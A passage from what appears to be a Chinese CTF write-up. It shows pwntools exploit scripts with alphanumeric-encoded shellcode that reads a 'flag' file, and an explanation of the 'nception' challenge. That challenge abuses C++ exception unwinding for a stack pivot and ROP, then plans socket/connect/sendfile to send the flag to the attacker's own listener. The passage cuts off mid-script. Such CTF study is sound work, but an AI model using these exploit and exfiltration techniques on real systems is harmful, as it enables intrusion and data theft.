</span></span></span><span class="line"><span class="cl"><span class="s2">push 0x50505050
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">xor rax,0x7073506c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#sc=shellcraft.read(0,0x20230120,0x100000001)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span><span class="o">=</span><span class="mh">0x20230000</span><span class="o">+</span><span class="mh">0xf0</span><span class="o">+</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">push 3
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="o">+=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">push rax
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">inc rdx
</span></span></span><span class="line"><span class="cl"><span class="s2">xor rbx,rbx
</span></span></span><span class="line"><span class="cl"><span class="s2">read_loop:
</span></span></span><span class="line"><span class="cl"><span class="s2">lea rsi,[rsp+rbx]
</span></span></span><span class="line"><span class="cl"><span class="s2">inc rbx
</span></span></span><span class="line"><span class="cl"><span class="s2">xor rax,rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">cmp rax,0
</span></span></span><span class="line"><span class="cl"><span class="s2">jne read_loop
</span></span></span><span class="line"><span class="cl"><span class="s2">push 1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdi
</span></span></span><span class="line"><span class="cl"><span class="s2">push 1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rdx
</span></span></span><span class="line"><span class="cl"><span class="s2">xor r8,r8
</span></span></span><span class="line"><span class="cl"><span class="s2">write_loop:
</span></span></span><span class="line"><span class="cl"><span class="s2">lea rsi,[rsp+r8]
</span></span></span><span class="line"><span class="cl"><span class="s2">inc r8
</span></span></span><span class="line"><span class="cl"><span class="s2">push 1
</span></span></span><span class="line"><span class="cl"><span class="s2">pop rax
</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
</span></span></span><span class="line"><span class="cl"><span class="s2">cmp r8,rbx
</span></span></span><span class="line"><span class="cl"><span class="s2">jne write_loop
</span></span></span><span class="line"><span class="cl"><span class="s2">push 0
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Give me your shellcode:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">enc_shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="n">AE64</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">),</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;small&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_shellcode</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">enc_shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="nception"><span>nception</span>
  <a href="#nception" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这题考察的主要是c++ 的异常处理。</p>
<p>程序本身里有两个catch块，一个位于main中，一个位于cleanup函数中。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111778.png' alt="image-20231230175735581"></p>
<p>在edit中，会判断 输入的buf，通过strlen(buf)计算长度，并判断其是否超过size，如果超过，就进入异常处理。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111779.png' alt="image-20231230175820132"></p>
<p>在unwind过程中，存在恢复栈帧的过程，也就是leave_ret。</p>
<h4 class="heading-element" id="思路一"><span>思路一</span>
  <a href="#%e6%80%9d%e8%b7%af%e4%b8%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>main函数catch在while内部，会接着main逻辑执行，而cleanup函数中close掉012就leave_ret;return了。</p>
<p>那么我们就可以利用cleanup进行栈迁移，进行rop。</p>
<p>由于程序关闭了0，1，2</p>
<p>那么我们就要利用 <code>open(&quot;flag&quot;),sockfd = socket(2, 1, 0),connect(sockfd, socked_addr, 16),sendfile(sockfd,flag_fd,offset,count)</code>，然后本机监听端口获得flag。</p>
<p>socket结构体的获取可参考该文章：https://blog.wingszeng.top/pwn-use-socket-to-bypass-close-out/</p>
<p>此外还需介绍一些特殊的gadget 用于设置调用函数的参数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x000000000040284c : pop rbx ; pop r12 ; pop rbp ; ret
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0x4022dc &lt;__do_global_dtors_aux+28&gt;:	add    DWORD PTR [rbp-0x3d],ebx
</span></span><span class="line"><span class="cl">0x4022df &lt;__do_global_dtors_aux+31&gt;:	nop
</span></span><span class="line"><span class="cl">0x4022e0 &lt;__do_global_dtors_aux+32&gt;:	ret  </span></span></code></pre></td></tr></table>
</div>
</div><p>在bss段残留的stderr stdout stdin 的libc地址，我们需要算出libc中函数地址具体这三者之一的偏移，通过上述两个gadget ，将其设置为我们想要的libc地址，接下来便是如何调用这个地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x00000000004022dd : pop rbp ; ret
</span></span><span class="line"><span class="cl">0x00000000004030e2 : mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret
</span></span><span class="line"><span class="cl">0x000000000040226c : jmp rax</span></span></code></pre></td></tr></table>
</div>
</div><p>通过上述gadget 我们可以控制rbp，进而控制rax，通过jmp rax 实现任意地址跳转执行。</p>
<p>但是程序中并没有pop rdi，rsi，rdx，这样的gadget 。</p>
<p>因此我们需要利用libc中的这样的gadget，来控制函数的参数，最后再调用所需要的函数。由于一个chunk的大小为0x200，所以我们需要在多个chunk 中布置rop链，通过pop rsp进行栈迁移。</p>
<blockquote>
<p>事实上我们可以调用mprotect 函数开辟rwx段写shellcode，这样所需的字节就会少很多</p>
<p>另外，由于程序是使用strlen 计算 要复制buf的长度，那么如果出现ROP链中出现<code>&quot;\x00&quot;</code>，就会被截断，std::cin在读取字符时会跳过空白字符（空格、制表符、换行符等），所以我们需要额外判断一下，是分八字节写还是逐个字节写</p></blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level=&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8.130.35.16&#34;</span><span class="p">,</span><span class="mi">58000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *0x402441&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now input your choice: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;To write object, input idx:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now data offset:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now input your data:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Which one do you want to read?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Which one do you want to destroy?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#   0x4022dc &lt;__do_global_dtors_aux+28&gt;:	add    DWORD PTR [rbp-0x3d],ebx</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   0x4022df &lt;__do_global_dtors_aux+31&gt;:	nop</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   0x4022e0 &lt;__do_global_dtors_aux+32&gt;:	ret  </span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl"><span class="c1">#   0x0000000000402f31 : call ptr [rbp - 0x3d]</span>
</span></span><span class="line"><span class="cl"><span class="n">magic_gadget</span><span class="o">=</span><span class="mh">0x4022dc</span>
</span></span><span class="line"><span class="cl"><span class="n">stdout_addr</span><span class="o">=</span><span class="mh">0x406040</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_addr</span><span class="o">=</span><span class="mh">0x4061A0</span> 
</span></span><span class="line"><span class="cl"><span class="n">call_rbp</span><span class="o">=</span><span class="mh">0x0000000000402f31</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rbx_r12_rbp_ret</span><span class="o">=</span><span class="mh">0x000000000040284c</span> <span class="c1">#: pop rbx ; pop r12 ; pop rbp ; ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#0x0000000000403121 : mov rax, qword ptr [rbp - 0x18] ; leave ; ret</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_func</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="n">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_func1</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">		<span class="n">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span><span class="n">flag</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;offset=&#34;</span><span class="p">,</span><span class="n">offset</span><span class="p">)</span>
